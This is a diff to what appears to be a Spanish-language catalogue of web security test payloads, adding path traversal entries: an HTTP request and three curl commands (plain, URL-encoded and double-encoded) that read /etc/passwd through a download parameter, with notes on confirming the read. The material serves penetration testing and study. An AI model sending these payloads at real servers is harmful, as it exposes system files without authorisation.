@@ -149,6 +149,17 @@ mutation {
 ..\canary-{NONCE}.txt
 ..\..\canary-{NONCE}.txt
 """, 'Poner el archivo marcador en un directorio propio fuera de la raíz permitida; la profundidad depende del despliegue.', PS+'file-path-traversal'),
+        B('basicos', 'Lectura clásica de /etc/passwd en Linux', 'http', """
+GET /download?file=../../../../etc/passwd HTTP/1.1
+Host: {ORIGEN}
+
+# Variantes del valor de file: ../etc/passwd | /etc/passwd
+""", 'Ajustar la profundidad al directorio base. Una respuesta con líneas como root:x:0:0 confirma lectura; conservar solo las líneas necesarias para evidenciarla.', PS+'file-path-traversal'),
+        B('contextos', 'Solicitud literal y codificada hacia /etc/passwd', 'bash', r"""
+curl --path-as-is 'https://{ORIGEN}/download?file=../../../../etc/passwd'
+curl --path-as-is 'https://{ORIGEN}/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd'
+curl --path-as-is 'https://{ORIGEN}/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+""", 'Probar cada URL por separado: la segunda requiere decodificación URL y la tercera, doble decodificación. Cotejar con un archivo de control y registrar la request que realmente salió del cliente.', PATT+'Directory%20Traversal/README.md'),
         B('basicos', 'Archivos convencionales para lectura acotada', 'text', r"""
 /etc/hosts
 /etc/hostname
